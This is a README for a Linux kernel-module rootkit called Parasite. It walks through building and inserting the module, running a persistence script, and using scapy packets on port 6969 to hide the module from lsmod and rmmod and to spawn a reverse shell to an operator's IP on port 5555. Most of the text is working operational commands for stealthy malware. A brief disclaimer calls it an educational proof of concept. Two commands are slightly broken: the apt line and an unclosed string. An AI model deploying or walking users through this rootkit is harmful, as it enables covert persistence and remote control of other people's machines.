# Parasite
This is a rootkit written in the form of a Linux kernel module (LKM), which currently contains module hiding, RCE/reverse shell, and persistence functionalities

## Installation
NOTE - Read the disclaimer if you haven't already. Additionally, it is *highly recommended* that you use this in a VM!

TODO: Insert working kernel versions/distros

1. Update system and ensure linux-headers is installed
```sh
apt update && install linux-headers-$(uname -r) -y
```

2. Clone repo (or download manually)
```
git clone https://github.com/MurryPuppins/Parasite.git
```

3. Enter directory and build the kernel module (requires Make)
```
cd Parasite

make
```

4. OPTIONAL: Establish persistence with the rootkit
```sh
chmod +x ./persist.sh

./persist.sh
```

5. Install the module
```sh
insmod LKM.ko
```

## Usage
Once the LKM is installed, you can verify its presence via lsmod
```sh
lsmod | grep Parasite
```

### RCE/Rootkit Usage

By default, Parasite listens for TCP packets on port 6969. The rootkit has 3 options that can be used: hide, show, and reverse shell. It doesn't matter how you send the packet, but personally I used scapy. 

Note: You *must* replace **INSERT_IP** with the LKM machine's IP



- ROOTKIT_HIDE - Hides the module from lsmod, thus inherently prevents it from being removed via rmmod as well
```
data='ROOTKIT_HIDE'
sr1(IP(dst="INSERT_IP")/TCP(dport=6969)/Raw(load=data))
```

- ROOTKIT_SHOW - Puts LKM back into list, thus allowing for removal via rmmod
```
data='ROOTKIT_SHOW'
sr1(IP(dst="INSERT_IP")/TCP(dport=6969)/Raw(load=data))
```

- ROOTKIT_RSHELL127.0.0.1 - This spawns a reverse shell using your IP (change 127.0.0.1 to your IP). You will need to be listening for port 5555 (default) on your machine to catch the shell
```
data='ROOTKIT_RSHELL127.0.0.1
sr1(IP(dst="INSERT_IP")/TCP(dport=6969)/Raw(load=data))
```

## Uninstallation
To disable Parasite from running on the host, you can remove it *assuming it isn't hidden*
```sh
rmmod LKM
```

If you ran the persistence script, you will need to undo the script. Additionally, using your preferred text editor, open up `etc/modules` and comment/remove the line containing `Parasite`
```sh
rm /lib/modules/$(uname -r)/kernel/lib/Parasite.ko

depmod -a
```


## Disclaimer
The author is in no way responsible for any illegal use of this software. It is provided purely as an educational proof of concept. I am also not responsible for any damages or mishaps that may happen in the course of using this software. Use at your own risk!

## References
TODO: Will add shortly
